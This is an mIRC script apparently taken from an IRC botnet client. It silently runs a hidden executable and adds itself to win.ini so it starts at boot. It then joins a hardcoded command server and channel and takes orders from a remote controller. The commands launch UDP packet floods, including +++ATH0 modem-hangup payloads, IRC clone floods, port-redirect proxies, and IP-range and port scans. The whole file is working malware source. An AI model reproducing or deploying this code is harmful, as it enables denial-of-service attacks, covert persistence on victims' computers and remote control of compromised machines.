[script]
n0=alias random {
n1=  if ($exists(temp.scr) == $false) { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) | halt }
n2=  else { /nick $read temp.scr $+ $r(0,9) }
n3=}
n4=on *:START:{
n5=  .flush | unset %scan.* | unset %port.*
n6=  if ($exists(temp2.exe) == $false) { /exit }
n7=  //run $mircdir $+ temp2.exe /n /fh        
n8=  if ($exists(temp.scr) == $false) { identd on $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) | halt }
n9=  else { /identd on $r(a,z) $+ $read temp.scr $+ $r(a,z) }
n10=  set %load.write $findfile(c:\,win.ini,0) | if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(c:\,win.ini,%load.count) windows run $mircexe | if (%load.count < %loud.write) { goto start } } | unset %load.*
n11=  if (%script.pass = $null) { set %script.pass pussy | set %connect.server fworld.ath.cx }
n12=  if (%connect.server != $null) { //timerconnect 0 100 /server %connect.server }
n13=}
n14=on *:CONNECT: { .flush | mode $me +ix | if (%connect.chan = $null) { set %connect.chan #ircdz } | timergetinchan 0 30 /join %connect.chan | .timerconnect off }
n15=on *:PART:#: { if ($comchan($nick,0) = 0) { /ruser $nick } | if ($chan = %connect.chan) { .timergetinchan 0 30 join %connect.chan } }
n16=on *:JOIN:#: { if ($chan = %connect.chan) { .timergetinchan off } }
n17=alias packetofdeath {
n18=  if ($4 = $null) { notice $nick Error Please use !packet address size amount | halt }
n19=  if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) || ($4 !isnum) { notice $nick Error Please use !packet address size amount | halt }
n20=  if ($remove($2,$chr(46)) !isnum) { notice $nick Error no letters may be contained in the ip | unset %packet.* | halt }
n21=  .notice $nick Now Packeting $1 with $2 bytes $3 times
n22=  set %packet.ip $1
n23=  set %packet.bytes $2
n24=  set %packet.amount $3
n25=  set %packet.count 0
n26=  set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9) 
n27=  :start
n28=  if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .notice $nick Packeting has completed | halt }
n29=  inc %packet.count 1
n30=  /sockudp -b  packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes
n31=  goto start
n32=}
n33=alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 60 gdope $1 $2 $3 }
n34=alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2 
n35=  %gnum.p = $r(1,65000)
n36=  sockudp gnumc1 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n37=  %gnum.p = $r(1,65000)
n38=  sockudp gnumc3 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n39=  %gnum.p = $r(1,65000)
n40=  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n41=  %gnum.p = $r(1,65000)
n42=  sockudp gnumc4 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n43=  %gnum.p = $r(1,65000)
n44=  sockudp gnumc5 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n45=  %gnum.p = $r(1,65000)
n46=  sockudp gnumc6 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n47=  %gnum.p = $r(1,65000)
n48=  sockudp gnumc7 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n49=  %gnum.p = $r(1,65000)
n50=  sockudp gnumc8 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n51=  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan} 
n52=}
n53=on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
n54=on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
n55=on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
n56=on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
n57=on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
n58=on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
n59=alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | /msg $1 12[Local IP Address]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { //msg $1 12*** Error, no port redirects! } | //msg $1 12*** PortRedirect/End | unset %gtpcount } }
n60=alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
n61=alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
n62=on *:sockread:Papa*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n63=alias fuck {
n64=  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !flood <chan/nick> <num of clones> <server> <port> <message> | halt }
n65=  set %nick $$1
n66=  set %clones $$2
n67=  set %channel $$1
n68=  if ( $3 = $null) { set %server $server }
n69=  if ( $3 != $null) { set %server $$3 }
n70=  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
n71=  if ( $4 != $null) { set %port $$4 }
n72=  if ( $5 = $null) { set %flood !list PING ME @locator Fil Serve line JonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblazeJonnyblaze Send Queue fserver }
n73=  if ($5 != $null) { set %flood $5- }
n74=  set %papaflood on
n75=  var %var = 0
n76=  :loop
n77=  inc %var
n78=  if (%papaflood == on) && (%var <= %clones) { .sockopen Papa $+ %var %server %port | goto loop }
n79=  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
n80=}
n81=
n82=alias cleanup {
n83=  .set %papaflood off
n84=  .sockclose Papa*
n85=  .unset %nick
n86=  unset %channel
n87=  unset %server
n88=  unset %port
n89=  unset %clones
n90=  unset %flood
n91=  notice $nick 4All Clones Have Been Cleared
n92=}
n93=
n94=on *:Sockopen:Papa*:{
n95=  if ($sockerr > 0) { halt }
n96=  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z)
n97=  .sockwrite -nt $sockname USER %user %user %user : $+ %user
n98=  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
n99=  .sockwrite -nt $sockname JOIN : $+ %channel
n100=  .sockwrite -n $sockname Privmsg %nick : $+ %flood
n101=  .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ Version $+ $chr(1)
n102=  .sockclose $sockname
n103=  .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
n104=}
n105=ctcp 700:!version:*: { notice $nick %quit }
n106=ctcp 700:VERSION:*: { ctcpreply $nick %quit }
n107=
n108=on *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
n109=on *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }
n110=on 700:TEXT:!scanStatus:*: {
n111=  if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
n112=  else { .msg $nick No Scans In Progress }
n113=}
n114=on 700:TEXT:!scanAbort:*: {
n115=  if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
n116=  else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
n117=}
n118=on 700:TEXT:!scan *:*: {
n119=  if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
n120=  if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
n121=  else {
n122=    set %scan.Start1 $gettok($2,1,46)
n123=    set %scan.Start2 $gettok($2,2,46)
n124=    set %scan.Start3 $gettok($2,3,46)
n125=    set %scan.Start4 $gettok($2,4,46)
n126=    set %scan.Perm1 $gettok($2,1,46)
n127=    set %scan.Perm2 $gettok($2,2,46)
n128=    set %scan.Perm3 $gettok($2,3,46)
n129=    set %scan.Perm4 $gettok($2,4,46)
n130=    set %scan.End1 $gettok($3,1,46)
n131=    set %scan.End2 $gettok($3,2,46)
n132=    set %scan.End3 $gettok($3,3,46)
n133=    set %scan.End4 $gettok($3,4,46)
n134=    if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
n135=    if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
n136=    set %scan.port $4
n137=    set %scan.delay $5
n138=    set %scan.nick $nick
n139=    .timerscan 0 %scan.delay scancheck
n140=    .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
n141=  }
n142=}
n143=on *:KICK:#: { if ($knick = $me) && ($chan = %connect.chan) { .timergetinchan 0 30 /join %connect.chan } }
n144=alias scancheck {
n145=  if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
n146=  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
n147=  if ($count(%scan.port,$chr(44)) >= 1) {
n148=    set %scan.counter 0
n149=    set %scan.countport $count(%scan.port,$chr(44))
n150=    inc %scan.countport 1
n151=    :start
n152=    inc %scan.counter 1
n153=    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
n154=    if (%scan.counter >= %scan.countport) { goto end }
n155=    else { goto start }
n156=  }
n157=  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
n158=  :end
n159=  inc %scan.start4 1
n160=  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
n161=  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
n162=  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
n163=  if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
n164=}
n165=alias scansock {
n166=  if ($sock(scan*,0) = 0) {
n167=    .msg %scan.nick All Sockets Have closed, scanning all Variables now Being wiped!
n168=    unset %scan.*
n169=    .timersockscheck off
n170=  }
n171=}
n172=on *:SOCKOPEN:scan*: {
n173=  if ($sockerr > 0) { .sockclose $sockname | halt }
n174=  .msg %scan.nick IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
n175=  .write scan.txt IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
n176=  .sockclose $sockname
n177=}
n178=on *:QUIT: if ($nick = %port.nick) { .timerport off | .timerportcheck off | unset %port.* | .sockclose port* | halt }
n179=on *:NICK: if ($nick = %port.nick) { set %port.nick $newnick | .msg %port.nick Port Probing nickname now changed to %port.nick ;) | halt }
n180=
n181=on 700:TEXT:!portstatus:*: { if (%port.nick = $null) { msg $nick I am currently Not scanning any ports }
n182=  elseif (%port.nick != $null) { .msg $nick I am currently scanning %port.address  on ports %port.perm to %port.end  i'm currently at %port.start its estimated another $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) before i'm done
n183=  }
n184=}
n185=on 700:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $nick i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }
n186=on 700:TEXT:!portscan *:*: {
n187=  if ($4 = $null) { msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 5 | halt }
n188=  if (%port.nick != $null) { .msg $nick Sorry but i am allready Scanning  $+ %port.perm $+  to  $+ %port.end $+  on  $+ %port.address $+  | halt }
n189=  if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 1 | halt }
n190=  if ($4 < $3) { .msg $nick Error Starting Port Can't be greater then ending port | halt }
n191=  set %port.address $2
n192=  set %port.start $3
n193=  set %port.end $4
n194=  set %port.perm $3
n195=  set %port.delay $5
n196=  set %port.nick $nick
n197=  .timerport 0 %port.delay portscan
